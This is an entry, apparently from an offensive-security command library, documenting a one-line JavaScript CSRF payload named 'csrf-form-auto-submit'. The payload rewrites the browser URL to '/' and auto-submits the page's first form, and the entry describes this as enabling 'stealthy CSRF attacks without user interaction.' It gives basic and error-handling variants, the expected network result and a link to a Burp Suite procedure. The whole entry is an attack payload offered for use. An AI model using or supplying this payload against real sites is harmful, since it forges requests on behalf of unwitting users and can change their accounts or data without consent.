---
id: c2e3f4g5-i6j7-8901-efgh-567890123456
data: 'history.pushState('''','''',''/''); document.forms[0].submit();'
tags:
  - csrf
  - auto-submit
type: command
output: 'Form submitted automatically, URL updated to ''/'''
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:27:49.585Z'
verified: false
validated: true
submitted: true
---
# csrf-form-auto-submit

## Command

```javascript
history.pushState('','','/'); document.forms[0].submit();
```

## Description

This JavaScript code updates the browser history to mimic the current page and automatically submits the first form on the page, enabling stealthy CSRF attacks without user interaction.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| history.pushState('','','/') | Pushes a new state to history, changing URL to '/' without reload | Yes |
| document.forms[0].submit() | Submits the first form element | Yes |

## Examples

### Basic Usage

```javascript
history.pushState('','','/'); document.forms[0].submit();
```

### Advanced Usage

Add error handling: try { history.pushState('','','/'); document.forms[0].submit(); } catch(e) { console.log('Submit failed'); }

## Expected Output

The browser URL changes to '/' silently, and the form POSTs its data to the target endpoint. Network tab shows the outgoing request confirming success.

## Related

- [[Related Procedure: Craft-CSRF-HTML-Page-with-Burp-Suite]]
